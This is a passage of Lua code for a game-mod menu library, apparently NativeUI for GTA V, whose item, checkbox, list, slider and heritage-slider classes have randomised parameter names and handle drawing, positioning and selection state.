        labelHighlightColour = {R = 0, G = 0, B = 0, A = 255}
    end
    if tostring(FYdHlxHc5zby47SkgJv) and FYdHlxHc5zby47SkgJv ~= nil then
        if type(labelMainColour) == "table" then
            self.Label.MainColour = labelMainColour
        end
        if type(labelHighlightColour) == "table" then
            self.Label.HighlightColour = labelHighlightColour
        end
        self.Label.Text:Text(tostring(FYdHlxHc5zby47SkgJv))
    else
        self.Label.MainColour = {R = 0, G = 0, B = 0, A = 0}
        self.Label.HighlightColour = {R = 0, G = 0, B = 0, A = 0}
        return self.Label.Text:Text()
    end
end
function UIMenuItem:SetLeftBadge(Eu)
    if tonumber(Eu) then
        self.LeftBadge.Badge = tonumber(Eu)
    end
end
function UIMenuItem:SetRightBadge(KLg3j4lhadnb5OtlO)
    if tonumber(KLg3j4lhadnb5OtlO) then
        self.RightBadge.Badge = tonumber(KLg3j4lhadnb5OtlO)
    end
end
function UIMenuItem:Text(iX5GHLCsus3gNuKwjkFv)
    if tostring(iX5GHLCsus3gNuKwjkFv) and iX5GHLCsus3gNuKwjkFv ~= nil then
        self.Text:Text(tostring(iX5GHLCsus3gNuKwjkFv))
    else
        return self.Text:Text()
    end
end
function UIMenuItem:SetTextSelectedColor(G2hF0OqjcMY1, C9RbEOD9KU0Xtl78x, Peaoa04J, y5gR8Vx39r0swJpG)
    if tonumber(G2hF0OqjcMY1) and tonumber(C9RbEOD9KU0Xtl78x) and tonumber(Peaoa04J) and tonumber(y5gR8Vx39r0swJpG) then
        self._Text.Colour.Selected.R = G2hF0OqjcMY1
        self._Text.Colour.Selected.G = C9RbEOD9KU0Xtl78x
        self._Text.Colour.Selected.B = Peaoa04J
        self._Text.Colour.Selected.A = y5gR8Vx39r0swJpG
    else
        return {
            R = self._Text.Colour.Selected.R,
            G = self._Text.Colour.Selected.G,
            B = self._Text.Colour.Selected.B,
            A = self._Text.Colour.Selected.A
        }
    end
end
function UIMenuItem:SetTextHoveredColor(Fnv, dO8YKuL921OnLgzxwOPbY, AdPLoHvbH32_, aqKWREuqt7IQe)
    if tonumber(Fnv) and tonumber(dO8YKuL921OnLgzxwOPbY) and tonumber(AdPLoHvbH32_) and tonumber(aqKWREuqt7IQe) then
        self._Text.Colour.Hovered.R = Fnv
        self._Text.Colour.Hovered.G = dO8YKuL921OnLgzxwOPbY
        self._Text.Colour.Hovered.B = AdPLoHvbH32_
        self._Text.Colour.Hovered.A = aqKWREuqt7IQe
    else
        return {
            R = self._Text.Colour.Hovered.R,
            G = self._Text.Colour.Hovered.G,
            B = self._Text.Colour.Hovered.B,
            A = self._Text.Colour.Hovered.A
        }
    end
end
function UIMenuItem:AddPanel(A1oULVKlz7ls2k_njSyv)
    if A1oULVKlz7ls2k_njSyv() == "UIMenuPanel" then
        table.insert(self.Panels, A1oULVKlz7ls2k_njSyv)
        A1oULVKlz7ls2k_njSyv:SetParentItem(self)
    end
end
function UIMenuItem:RemovePanelAt(AGgbF1TcPzI0tWoysdwq4)
    if tonumber(AGgbF1TcPzI0tWoysdwq4) then
        if self.Panels[AGgbF1TcPzI0tWoysdwq4] then
            table.remove(self.Panels, tonumber(AGgbF1TcPzI0tWoysdwq4))
        end
    end
end
function UIMenuItem:FindPanelIndex(QTWFZ8bcaVKNFLbZg2BW3)
    if QTWFZ8bcaVKNFLbZg2BW3() == "UIMenuPanel" then
        for Index = 1, #self.Panels do
            if self.Panels[Index] == QTWFZ8bcaVKNFLbZg2BW3 then
                return Index
            end
        end
    end
    return nil
end
function UIMenuItem:FindPanelItem()
    for Index = #self.Items, 1, -1 do
        if self.Items[Index].Panel then
            return Index
        end
    end
    return nil
end
function UIMenuItem:Draw()
    self.Rectangle:Size(431 + self.ParentMenu.WidthOffset, self.Rectangle.Height)
    self.SelectedSprite:Size(431 + self.ParentMenu.WidthOffset, self.SelectedSprite.Height)
    if self._Hovered and not self._Selected then
        self.Rectangle:Draw()
    end
    if self._Selected then
        self.SelectedSprite:Draw()
    end
    if self._Enabled then
        if self._Selected then
            self.Text:Colour(
                self._Text.Colour.Selected.R,
                self._Text.Colour.Selected.G,
                self._Text.Colour.Selected.B,
                self._Text.Colour.Selected.A
            )
            self.Label.Text:Colour(
                self.Label.HighlightColour.R,
                self.Label.HighlightColour.G,
                self.Label.HighlightColour.B,
                self.Label.HighlightColour.A
            )
        else
            self.Text:Colour(
                self._Text.Colour.Hovered.R,
                self._Text.Colour.Hovered.G,
                self._Text.Colour.Hovered.B,
                self._Text.Colour.Hovered.A
            )
            self.Label.Text:Colour(
                self.Label.MainColour.R,
                self.Label.MainColour.G,
                self.Label.MainColour.B,
                self.Label.MainColour.A
            )
        end
    else
        self.Text:Colour(163, 159, 148, 255)
        self.Label.Text:Colour(163, 159, 148, 255)
    end
    if self.LeftBadge.Badge == BadgeStyle.None then
        self.Text:Position(self._Text.Padding.X + self._Offset.X, self.Text.Y)
    else
        self.Text:Position(35 + self._Offset.X, self.Text.Y)
        self.LeftBadge.Sprite.TxtDictionary = GetBadgeDictionary(self.LeftBadge.Badge, self._Selected)
        self.LeftBadge.Sprite.TxtName = GetBadgeTexture(self.LeftBadge.Badge, self._Selected)
        self.LeftBadge.Sprite:Colour(GetBadgeColour(self.LeftBadge.Badge, self._Selected))
        self.LeftBadge.Sprite:Draw()
    end
    if self.RightBadge.Badge ~= BadgeStyle.None then
        self.RightBadge.Sprite:Position(385 + self._Offset.X + self.ParentMenu.WidthOffset, self.RightBadge.Sprite.Y)
        self.RightBadge.Sprite.TxtDictionary = GetBadgeDictionary(self.RightBadge.Badge, self._Selected)
        self.RightBadge.Sprite.TxtName = GetBadgeTexture(self.RightBadge.Badge, self._Selected)
        self.RightBadge.Sprite:Colour(GetBadgeColour(self.RightBadge.Badge, self._Selected))
        self.RightBadge.Sprite:Draw()
    end
    if self.Label.Text:Text() ~= "" and string.len(self.Label.Text:Text()) > 0 then
        if self.RightBadge.Badge ~= BadgeStyle.None then
            self.Label.Text:Position(385 + self._Offset.X + self.ParentMenu.WidthOffset, self.Label.Text.Y)
            self.Label.Text:Draw()
        else
            self.Label.Text:Position(420 + self._Offset.X + self.ParentMenu.WidthOffset, self.Label.Text.Y)
            self.Label.Text:Draw()
        end
    end
    self.Text:Draw()
end
UIMenuCheckboxItem = setmetatable({}, UIMenuCheckboxItem)
UIMenuCheckboxItem.__index = UIMenuCheckboxItem
UIMenuCheckboxItem.__call = function()
    return "UIMenuItem", "UIMenuCheckboxItem"
end
function UIMenuCheckboxItem.New(NV, ASG3OtgeEnyKi7x, CTVl37sMr, miiSIgqtGVcGWmIHW)
    if miiSIgqtGVcGWmIHW ~= nil then
        miiSIgqtGVcGWmIHW = tonumber(miiSIgqtGVcGWmIHW)
    else
        miiSIgqtGVcGWmIHW = 1
    end
    local zrD = {
        Base = UIMenuItem.New(NV or "", CTVl37sMr or ""),
        CheckboxStyle = miiSIgqtGVcGWmIHW,
        CheckedSprite = Sprite.New("commonmenu", "shop_box_blank", 410, 95, 50, 50),
        Checked = tobool(ASG3OtgeEnyKi7x),
        CheckboxEvent = function(zu_ntWG5SJVCl5HG, snjCKYr, FUtzxLnN_tKJ3k)
        end
    }
    return setmetatable(zrD, UIMenuCheckboxItem)
end
function UIMenuCheckboxItem:SetParentMenu(Bl53A3OU)
    if Bl53A3OU() == "UIMenu" then
        self.Base.ParentMenu = Bl53A3OU
    else
        return self.Base.ParentMenu
    end
end
function UIMenuCheckboxItem:Position(fTdTHDjYN)
    if tonumber(fTdTHDjYN) then
        self.Base:Position(fTdTHDjYN)
        self.CheckedSprite:Position(
            380 + self.Base._Offset.X + self.Base.ParentMenu.WidthOffset,
            fTdTHDjYN + 138 + self.Base._Offset.Y
        )
    end
end
function UIMenuCheckboxItem:Selected(xqgkc0Knft6mO3Kh00)
    if xqgkc0Knft6mO3Kh00 ~= nil then
        self.Base._Selected = tobool(xqgkc0Knft6mO3Kh00)
    else
        return self.Base._Selected
    end
end
function UIMenuCheckboxItem:Hovered(FPbw0nXLYG51)
    if FPbw0nXLYG51 ~= nil then
        self.Base._Hovered = tobool(FPbw0nXLYG51)
    else
        return self.Base._Hovered
    end
end
function UIMenuCheckboxItem:Enabled(NykIW2YG3kUV_qbum3zs)
    if NykIW2YG3kUV_qbum3zs ~= nil then
        self.Base._Enabled = tobool(NykIW2YG3kUV_qbum3zs)
    else
        return self.Base._Enabled
    end
end
function UIMenuCheckboxItem:Description(YKrjhO6Idw_EMpFzWkOAS)
    if tostring(YKrjhO6Idw_EMpFzWkOAS) and YKrjhO6Idw_EMpFzWkOAS ~= nil then
        self.Base._Description = tostring(YKrjhO6Idw_EMpFzWkOAS)
    else
        return self.Base._Description
    end
end
function UIMenuCheckboxItem:Offset(aF, Dib3yOwSzL6)
    if tonumber(aF) or tonumber(Dib3yOwSzL6) then
        if tonumber(aF) then
            self.Base._Offset.X = tonumber(aF)
        end
        if tonumber(Dib3yOwSzL6) then
            self.Base._Offset.Y = tonumber(Dib3yOwSzL6)
        end
    else
        return self.Base._Offset
    end
end
function UIMenuCheckboxItem:Text(iLn8h4azWssTUcQQAJzH8)
    if tostring(iLn8h4azWssTUcQQAJzH8) and iLn8h4azWssTUcQQAJzH8 ~= nil then
        self.Base.Text:Text(tostring(iLn8h4azWssTUcQQAJzH8))
    else
        return self.Base.Text:Text()
    end
end
function UIMenuCheckboxItem:SetLeftBadge()
    error("This item does not support badges")
end
function UIMenuCheckboxItem:SetRightBadge()
    error("This item does not support badges")
end
function UIMenuCheckboxItem:RightLabel()
    error("This item does not support a right label")
end
function UIMenuCheckboxItem:Draw()
    self.Base:Draw()
    self.CheckedSprite:Position(380 + self.Base._Offset.X + self.Base.ParentMenu.WidthOffset, self.CheckedSprite.Y)
    if self.CheckboxStyle == nil or self.CheckboxStyle == tonumber(1) then
        if self.Base:Selected() then
            if self.Checked then
                self.CheckedSprite.TxtName = "shop_box_tickb"
            else
                self.CheckedSprite.TxtName = "shop_box_blankb"
            end
        else
            if self.Checked then
                self.CheckedSprite.TxtName = "shop_box_tick"
            else
                self.CheckedSprite.TxtName = "shop_box_blank"
            end
        end
    elseif self.CheckboxStyle == tonumber(2) then
        if self.Base:Selected() then
            if self.Checked then
                self.CheckedSprite.TxtName = "shop_box_crossb"
            else
                self.CheckedSprite.TxtName = "shop_box_blankb"
            end
        else
            if self.Checked then
                self.CheckedSprite.TxtName = "shop_box_cross"
            else
                self.CheckedSprite.TxtName = "shop_box_blank"
            end
        end
    end
    self.CheckedSprite:Draw()
end
UIMenuListItem = setmetatable({}, UIMenuListItem)
UIMenuListItem.__index = UIMenuListItem
UIMenuListItem.__call = function()
    return "UIMenuItem", "UIMenuListItem"
end
function UIMenuListItem.New(eIC3N2kA5SkO, u, xvS0xlCQGS, mppEkJO8uCWOn)
    if type(u) ~= "table" then
        u = {}
    end
    if xvS0xlCQGS == 0 then
        xvS0xlCQGS = 1
    end
    local kJJ2smzGVsW91csgvPPYv = {
        Base = UIMenuItem.New(eIC3N2kA5SkO or "", mppEkJO8uCWOn or ""),
        Items = u,
        LeftArrow = Sprite.New("commonmenu", "arrowleft", 110, 105, 30, 30),
        RightArrow = Sprite.New("commonmenu", "arrowright", 280, 105, 30, 30),
        ItemText = UIResText.New("", 290, 104, 0.35, 255, 255, 255, 255, 0, "Right"),
        _Index = tonumber(xvS0xlCQGS) or 1,
        Panels = {},
        OnListChanged = function(xMc11LAbJw1WmG42dm1ZS, C7l8YcrLYhku9ws, _H3ctcje5)
        end,
        OnListSelected = function(Cc6HUeIP, Ub, OIU2ITku5EOjfQ)
        end
    }
    return setmetatable(kJJ2smzGVsW91csgvPPYv, UIMenuListItem)
end
function UIMenuListItem:SetParentMenu(IuIFZXrp3573Z_ac4XmA)
    if IuIFZXrp3573Z_ac4XmA ~= nil and IuIFZXrp3573Z_ac4XmA() == "UIMenu" then
        self.Base.ParentMenu = IuIFZXrp3573Z_ac4XmA
    else
        return self.Base.ParentMenu
    end
end
function UIMenuListItem:Position(grxW)
    if tonumber(grxW) then
        self.LeftArrow:Position(
            300 + self.Base._Offset.X + self.Base.ParentMenu.WidthOffset,
            147 + grxW + self.Base._Offset.Y
        )
        self.RightArrow:Position(
            400 + self.Base._Offset.X + self.Base.ParentMenu.WidthOffset,
            147 + grxW + self.Base._Offset.Y
        )
        self.ItemText:Position(
            300 + self.Base._Offset.X + self.Base.ParentMenu.WidthOffset,
            147 + grxW + self.Base._Offset.Y
        )
        self.Base:Position(grxW)
    end
end
function UIMenuListItem:Selected(vigjqNU8GQ)
    if vigjqNU8GQ ~= nil then
        self.Base._Selected = tobool(vigjqNU8GQ)
    else
        return self.Base._Selected
    end
end
function UIMenuListItem:Hovered(UL0zLY)
    if UL0zLY ~= nil then
        self.Base._Hovered = tobool(UL0zLY)
    else
        return self.Base._Hovered
    end
end
function UIMenuListItem:Enabled(tFjAdaIMHX9bTgsuzxORU)
    if tFjAdaIMHX9bTgsuzxORU ~= nil then
        self.Base._Enabled = tobool(tFjAdaIMHX9bTgsuzxORU)
    else
        return self.Base._Enabled
    end
end
function UIMenuListItem:Description(xCRbt)
    if tostring(xCRbt) and xCRbt ~= nil then
        self.Base._Description = tostring(xCRbt)
    else
        return self.Base._Description
    end
end
function UIMenuListItem:Offset(hwoyqmCuXt, IbCmB5pp15PDF_v1)
    if tonumber(hwoyqmCuXt) or tonumber(IbCmB5pp15PDF_v1) then
        if tonumber(hwoyqmCuXt) then
            self.Base._Offset.X = tonumber(hwoyqmCuXt)
        end
        if tonumber(IbCmB5pp15PDF_v1) then
            self.Base._Offset.Y = tonumber(IbCmB5pp15PDF_v1)
        end
    else
        return self.Base._Offset
    end
end
function UIMenuListItem:Text(_gAj8TVnyGqo15Mnp4Rr)
    if tostring(_gAj8TVnyGqo15Mnp4Rr) and _gAj8TVnyGqo15Mnp4Rr ~= nil then
        self.Base.Text:Text(tostring(_gAj8TVnyGqo15Mnp4Rr))
    else
        return self.Base.Text:Text()
    end
end
function UIMenuListItem:Index(mVW75lZBjNpLoqd)
    if tonumber(mVW75lZBjNpLoqd) then
        if tonumber(mVW75lZBjNpLoqd) > #self.Items then
            self._Index = 1
        elseif tonumber(mVW75lZBjNpLoqd) < 1 then
            self._Index = #self.Items
        else
            self._Index = tonumber(mVW75lZBjNpLoqd)
        end
    else
        return self._Index
    end
end
function UIMenuListItem:ItemToIndex(O8BvRHLMc_O)
    for i = 1, #self.Items do
        if type(O8BvRHLMc_O) == type(self.Items[i]) and O8BvRHLMc_O == self.Items[i] then
            return i
        elseif
            type(self.Items[i]) == "table" and
                (type(O8BvRHLMc_O) == type(self.Items[i].Name) or type(O8BvRHLMc_O) == type(self.Items[i].Value)) and
                (O8BvRHLMc_O == self.Items[i].Name or O8BvRHLMc_O == self.Items[i].Value)
         then
            return i
        end
    end
end
function UIMenuListItem:IndexToItem(BxLnisCDAI898eMHJ)
    if tonumber(BxLnisCDAI898eMHJ) then
        if tonumber(BxLnisCDAI898eMHJ) == 0 then
            BxLnisCDAI898eMHJ = 1
        end
        if self.Items[tonumber(BxLnisCDAI898eMHJ)] then
            return self.Items[tonumber(BxLnisCDAI898eMHJ)]
        end
    end
end
function UIMenuListItem:SetLeftBadge()
    error("This item does not support badges")
end
function UIMenuListItem:SetRightBadge()
    error("This item does not support badges")
end
function UIMenuListItem:RightLabel()
    error("This item does not support a right label")
end
function UIMenuListItem:AddPanel(AJtG3q8)
    if AJtG3q8() == "UIMenuPanel" then
        table.insert(self.Panels, AJtG3q8)
        AJtG3q8:SetParentItem(self)
    end
end
function UIMenuListItem:RemovePanelAt(U)
    if tonumber(U) then
        if self.Panels[U] then
            table.remove(self.Panels, tonumber(U))
        end
    end
end
function UIMenuListItem:FindPanelIndex(Jx84zcV)
    if Jx84zcV() == "UIMenuPanel" then
        for Index = 1, #self.Panels do
            if self.Panels[Index] == Jx84zcV then
                return Index
            end
        end
    end
    return nil
end
function UIMenuListItem:FindPanelItem()
    for Index = #self.Items, 1, -1 do
        if self.Items[Index].Panel then
            return Index
        end
    end
    return nil
end
function UIMenuListItem:Draw()
    self.Base:Draw()
    if self:Enabled() then
        if self:Selected() then
            self.ItemText:Colour(0, 0, 0, 255)
            self.LeftArrow:Colour(0, 0, 0, 255)
            self.RightArrow:Colour(0, 0, 0, 255)
        else
            self.ItemText:Colour(245, 245, 245, 255)
            self.LeftArrow:Colour(245, 245, 245, 255)
            self.RightArrow:Colour(245, 245, 245, 255)
        end
    else
        self.ItemText:Colour(163, 159, 148, 255)
        self.LeftArrow:Colour(163, 159, 148, 255)
        self.RightArrow:Colour(163, 159, 148, 255)
    end
    local Oh3d =
        (type(self.Items[self._Index]) == "table") and tostring(self.Items[self._Index].Name) or
        tostring(self.Items[self._Index])
    local TPQ4YfflVSoVM = MeasureStringWidth(Oh3d, 0, 0.35)
    self.ItemText:Text(Oh3d)
    self.LeftArrow:Position(
        378 - TPQ4YfflVSoVM + self.Base._Offset.X + self.Base.ParentMenu.WidthOffset,
        self.LeftArrow.Y
    )
    self.LeftArrow:Draw()
    self.RightArrow:Draw()
    self.ItemText:Position(403 + self.Base._Offset.X + self.Base.ParentMenu.WidthOffset, self.ItemText.Y)
    self.ItemText:Draw()
end
UIMenuSliderItem = setmetatable({}, UIMenuSliderItem)
UIMenuSliderItem.__index = UIMenuSliderItem
UIMenuSliderItem.__call = function()
    return "UIMenuItem", "UIMenuSliderItem"
end
function UIMenuSliderItem.New(
    shLMEe4Z,
    R7w6FgtY_fUW,
    QJ0XdDrQAwQz1JFu,
    VgQj,
    Ukbcf5CxeF4VB_pd,
    dzjW1vhq3feLj,
    DrbDsm_gQ1mYllwb6fOu9)
    if type(R7w6FgtY_fUW) ~= "table" then
        R7w6FgtY_fUW = {}
    end
    if QJ0XdDrQAwQz1JFu == 0 then
        QJ0XdDrQAwQz1JFu = 1
    end
    if type(dzjW1vhq3feLj) ~= "table" or dzjW1vhq3feLj == nil then
        _SliderColors = {R = 57, G = 119, B = 200, A = 255}
    else
        _SliderColors = dzjW1vhq3feLj
    end
    if type(DrbDsm_gQ1mYllwb6fOu9) ~= "table" or DrbDsm_gQ1mYllwb6fOu9 == nil then
        _BackgroundSliderColors = {R = 4, G = 32, B = 57, A = 255}
    else
        _BackgroundSliderColors = DrbDsm_gQ1mYllwb6fOu9
    end
    local HCFlF = {
        Base = UIMenuItem.New(shLMEe4Z or "", VgQj or ""),
        Items = R7w6FgtY_fUW,
        ShowDivider = tobool(Ukbcf5CxeF4VB_pd),
        LeftArrow = Sprite.New("commonmenu", "arrowleft", 0, 105, 25, 25),
        RightArrow = Sprite.New("commonmenu", "arrowright", 0, 105, 25, 25),
        Background = UIResRectangle.New(
            0,
            0,
            150,
            10,
            _BackgroundSliderColors.R,
            _BackgroundSliderColors.G,
            _BackgroundSliderColors.B,
            _BackgroundSliderColors.A
        ),
        Slider = UIResRectangle.New(0, 0, 75, 10, _SliderColors.R, _SliderColors.G, _SliderColors.B, _SliderColors.A),
        Divider = UIResRectangle.New(0, 0, 4, 20, 255, 255, 255, 255),
        _Index = tonumber(QJ0XdDrQAwQz1JFu) or 1,
        OnSliderChanged = function(i9J6n, e7olnU2eARR47hPRzNk, KzR8nT4YqjOs90hKOY)
        end,
        OnSliderSelected = function(NB46HbOe9hzl8B3qTM71, uthAoY5JWF, U2q6hGfR5odcR)
        end
    }
    return setmetatable(HCFlF, UIMenuSliderItem)
end
function UIMenuSliderItem:SetParentMenu(ra5)
    if ra5() == "UIMenu" then
        self.Base.ParentMenu = ra5
    else
        return self.Base.ParentMenu
    end
end
function UIMenuSliderItem:Position(SSilQOvibQ3pMBFpGtEim)
    if tonumber(SSilQOvibQ3pMBFpGtEim) then
        self.Background:Position(
            250 + self.Base._Offset.X + self.Base.ParentMenu.WidthOffset,
            SSilQOvibQ3pMBFpGtEim + 158.5 + self.Base._Offset.Y
        )
        self.Slider:Position(
            250 + self.Base._Offset.X + self.Base.ParentMenu.WidthOffset,
            SSilQOvibQ3pMBFpGtEim + 158.5 + self.Base._Offset.Y
        )
        self.Divider:Position(
            323.5 + self.Base._Offset.X + self.Base.ParentMenu.WidthOffset,
            SSilQOvibQ3pMBFpGtEim + 153 + self.Base._Offset.Y
        )
        self.LeftArrow:Position(
            225 + self.Base._Offset.X + self.Base.ParentMenu.WidthOffset,
            150.5 + SSilQOvibQ3pMBFpGtEim + self.Base._Offset.Y
        )
        self.RightArrow:Position(
            400 + self.Base._Offset.X + self.Base.ParentMenu.WidthOffset,
            150.5 + SSilQOvibQ3pMBFpGtEim + self.Base._Offset.Y
        )
        self.Base:Position(SSilQOvibQ3pMBFpGtEim)
    end
end
function UIMenuSliderItem:Selected(ZjPou5WyRnjf408kbFqF)
    if ZjPou5WyRnjf408kbFqF ~= nil then
        self.Base._Selected = tobool(ZjPou5WyRnjf408kbFqF)
    else
        return self.Base._Selected
    end
end
function UIMenuSliderItem:Hovered(y3mUzxgovy8jL4TJ6)
    if y3mUzxgovy8jL4TJ6 ~= nil then
        self.Base._Hovered = tobool(y3mUzxgovy8jL4TJ6)
    else
        return self.Base._Hovered
    end
end
function UIMenuSliderItem:Enabled(XkODgccVAYX)
    if XkODgccVAYX ~= nil then
        self.Base._Enabled = tobool(XkODgccVAYX)
    else
        return self.Base._Enabled
    end
end
function UIMenuSliderItem:Description(TngUJIEIPF)
    if tostring(TngUJIEIPF) and TngUJIEIPF ~= nil then
        self.Base._Description = tostring(TngUJIEIPF)
    else
        return self.Base._Description
    end
end
function UIMenuSliderItem:Offset(_iRiNUH0VlOgbDD1iOE, mZQ52sgjXBPIw7)
    if tonumber(_iRiNUH0VlOgbDD1iOE) or tonumber(mZQ52sgjXBPIw7) then
        if tonumber(_iRiNUH0VlOgbDD1iOE) then
            self.Base._Offset.X = tonumber(_iRiNUH0VlOgbDD1iOE)
        end
        if tonumber(mZQ52sgjXBPIw7) then
            self.Base._Offset.Y = tonumber(mZQ52sgjXBPIw7)
        end
    else
        return self.Base._Offset
    end
end
function UIMenuSliderItem:Text(v4RtVCbmIFECAY)
    if tostring(v4RtVCbmIFECAY) and v4RtVCbmIFECAY ~= nil then
        self.Base.Text:Text(tostring(v4RtVCbmIFECAY))
    else
        return self.Base.Text:Text()
    end
end
function UIMenuSliderItem:Index(bsmRaVSSj8TB)
    if tonumber(bsmRaVSSj8TB) then
        if tonumber(bsmRaVSSj8TB) > #self.Items then
            self._Index = 1
        elseif tonumber(bsmRaVSSj8TB) < 1 then
            self._Index = #self.Items
        else
            self._Index = tonumber(bsmRaVSSj8TB)
        end
    else
        return self._Index
    end
end
function UIMenuSliderItem:ItemToIndex(M4GVNy08FEZCcIiCr4DWM)
    for i = 1, #self.Items do
        if type(M4GVNy08FEZCcIiCr4DWM) == type(self.Items[i]) and M4GVNy08FEZCcIiCr4DWM == self.Items[i] then
            return i
        end
    end
end
function UIMenuSliderItem:IndexToItem(QqkMQw95nNVLk)
    if tonumber(QqkMQw95nNVLk) then
        if tonumber(QqkMQw95nNVLk) == 0 then
            QqkMQw95nNVLk = 1
        end
        if self.Items[tonumber(QqkMQw95nNVLk)] then
            return self.Items[tonumber(QqkMQw95nNVLk)]
        end
    end
end
function UIMenuSliderItem:SetLeftBadge()
    error("This item does not support badges")
end
function UIMenuSliderItem:SetRightBadge()
    error("This item does not support badges")
end
function UIMenuSliderItem:RightLabel()
    error("This item does not support a right label")
end
function UIMenuSliderItem:Draw()
    self.Base:Draw()
    if self:Enabled() then
        if self:Selected() then
            self.LeftArrow:Colour(0, 0, 0, 255)
            self.RightArrow:Colour(0, 0, 0, 255)
        else
            self.LeftArrow:Colour(245, 245, 245, 255)
            self.RightArrow:Colour(245, 245, 245, 255)
        end
    else
        self.LeftArrow:Colour(163, 159, 148, 255)
        self.RightArrow:Colour(163, 159, 148, 255)
    end
    local TWdcdNy5A5sNtOdtrrw = ((self.Background.Width - self.Slider.Width) / (#self.Items - 1)) * (self._Index - 1)
    self.Slider:Position(
        250 + self.Base._Offset.X + TWdcdNy5A5sNtOdtrrw + self.Base.ParentMenu.WidthOffset,
        self.Slider.Y
    )
    if self:Selected() then
        self.LeftArrow:Draw()
        self.RightArrow:Draw()
    end
    self.Background:Draw()
    self.Slider:Draw()
    if self.ShowDivider then
        self.Divider:Draw()
    end
end
UIMenuSliderHeritageItem = setmetatable({}, UIMenuSliderHeritageItem)
UIMenuSliderHeritageItem.__index = UIMenuSliderHeritageItem
UIMenuSliderHeritageItem.__call = function()
    return "UIMenuItem", "UIMenuSliderHeritageItem"
end
function UIMenuSliderHeritageItem.New(
    hOjI0,
    UT,
    aCXhUr6zg1KNvFabGJMj,
    AHjJoAznUcWV93gIqhJ,
    ZkfMu35E_Q0akD8ljLn,
    iVrPQHJG8OXmQVV)
    if type(UT) ~= "table" then
        UT = {}
    end
    if aCXhUr6zg1KNvFabGJMj == 0 then
        aCXhUr6zg1KNvFabGJMj = 1
    end
    if type(ZkfMu35E_Q0akD8ljLn) ~= "table" or ZkfMu35E_Q0akD8ljLn == nil then
        _SliderColors = {R = 57, G = 119, B = 200, A = 255}
    else
        _SliderColors = ZkfMu35E_Q0akD8ljLn
    end
    if type(iVrPQHJG8OXmQVV) ~= "table" or iVrPQHJG8OXmQVV == nil then
        _BackgroundSliderColors = {R = 4, G = 32, B = 57, A = 255}
    else
        _BackgroundSliderColors = iVrPQHJG8OXmQVV
    end
    local GFD = {
        Base = UIMenuItem.New(hOjI0 or "", AHjJoAznUcWV93gIqhJ or ""),
        Items = UT,
        LeftArrow = Sprite.New("mpleaderboard", "leaderboard_female_icon", 0, 0, 40, 40, 0, 255, 255, 255, 255),
        RightArrow = Sprite.New("mpleaderboard", "leaderboard_male_icon", 0, 0, 40, 40, 0, 255, 255, 255, 255),
        Background = UIResRectangle.New(
            0,
            0,
            150,
            10,
            _BackgroundSliderColors.R,
            _BackgroundSliderColors.G,
            _BackgroundSliderColors.B,
            _BackgroundSliderColors.A
        ),
        Slider = UIResRectangle.New(0, 0, 75, 10, _SliderColors.R, _SliderColors.G, _SliderColors.B, _SliderColors.A),
        Divider = UIResRectangle.New(0, 0, 4, 20, 255, 255, 255, 255),
        _Index = tonumber(aCXhUr6zg1KNvFabGJMj) or 1,
        Audio = {Slider = "CONTINUOUS_SLIDER", Library = "HUD_FRONTEND_DEFAULT_SOUNDSET", Id = nil},
        OnSliderChanged = function(FDquqFf, yD6GDwsoDyKOWgFuAN, NYBK8A_tq_IjiyIQg_)
        end,
        OnSliderSelected = function(o3sloXlsVU5R, Gz0fNJNwXOV3xwYtLe_n3, G)
        end
    }
    return setmetatable(GFD, UIMenuSliderHeritageItem)
end
function UIMenuSliderHeritageItem:SetParentMenu(jXIuAftf5J6YcJ023U)
    if jXIuAftf5J6YcJ023U() == "UIMenu" then
        self.Base.ParentMenu = jXIuAftf5J6YcJ023U
    else
        return self.Base.ParentMenu
    end
end
function UIMenuSliderHeritageItem:Position(o_nhglI0v97PP_s2)
    if tonumber(o_nhglI0v97PP_s2) then
        self.Background:Position(
            250 + self.Base._Offset.X + self.Base.ParentMenu.WidthOffset,
            o_nhglI0v97PP_s2 + 158.5 + self.Base._Offset.Y
        )
        self.Slider:Position(
            250 + self.Base._Offset.X + self.Base.ParentMenu.WidthOffset,
            o_nhglI0v97PP_s2 + 158.5 + self.Base._Offset.Y
        )
        self.Divider:Position(
            323.5 + self.Base._Offset.X + self.Base.ParentMenu.WidthOffset,
            o_nhglI0v97PP_s2 + 153 + self.Base._Offset.Y
        )
        self.LeftArrow:Position(
            217 + self.Base._Offset.X + self.Base.ParentMenu.WidthOffset,
            143.5 + o_nhglI0v97PP_s2 + self.Base._Offset.Y
        )
        self.RightArrow:Position(
            395 + self.Base._Offset.X + self.Base.ParentMenu.WidthOffset,
            143.5 + o_nhglI0v97PP_s2 + self.Base._Offset.Y
        )
        self.Base:Position(o_nhglI0v97PP_s2)
    end
end
function UIMenuSliderHeritageItem:Selected(U2uHTcZMxBC73g)
    if U2uHTcZMxBC73g ~= nil then
        self.Base._Selected = tobool(U2uHTcZMxBC73g)
    else
        return self.Base._Selected
    end
end
function UIMenuSliderHeritageItem:Hovered(ttcuq5_B4UYWbzE)
    if ttcuq5_B4UYWbzE ~= nil then
        self.Base._Hovered = tobool(ttcuq5_B4UYWbzE)
    else
        return self.Base._Hovered
    end
end
function UIMenuSliderHeritageItem:Enabled(I8N1Z3IiglS5rPiWw)
    if I8N1Z3IiglS5rPiWw ~= nil then
        self.Base._Enabled = tobool(I8N1Z3IiglS5rPiWw)
    else
        return self.Base._Enabled
    end
end
function UIMenuSliderHeritageItem:Description(bZwxyoxbtoJvkeJAt4)
    if tostring(bZwxyoxbtoJvkeJAt4) and bZwxyoxbtoJvkeJAt4 ~= nil then
        self.Base._Description = tostring(bZwxyoxbtoJvkeJAt4)
    else
        return self.Base._Description
    end
end
function UIMenuSliderHeritageItem:Offset(gFZ8Wf86iyYb7RC6p, vEQCC4Bi)
    if tonumber(gFZ8Wf86iyYb7RC6p) or tonumber(vEQCC4Bi) then
        if tonumber(gFZ8Wf86iyYb7RC6p) then
            self.Base._Offset.X = tonumber(gFZ8Wf86iyYb7RC6p)
        end
        if tonumber(vEQCC4Bi) then
            self.Base._Offset.Y = tonumber(vEQCC4Bi)
        end
    else
        return self.Base._Offset
    end
end
function UIMenuSliderHeritageItem:Text(tc13FCmjsV)
    if tostring(tc13FCmjsV) and tc13FCmjsV ~= nil then
        self.Base.Text:Text(tostring(tc13FCmjsV))
    else
        return self.Base.Text:Text()
    end
end
function UIMenuSliderHeritageItem:Index(Dq4IGxmvxn3n)
    if tonumber(Dq4IGxmvxn3n) then
        if tonumber(Dq4IGxmvxn3n) > #self.Items then
            self._Index = 1
        elseif tonumber(Dq4IGxmvxn3n) < 1 then
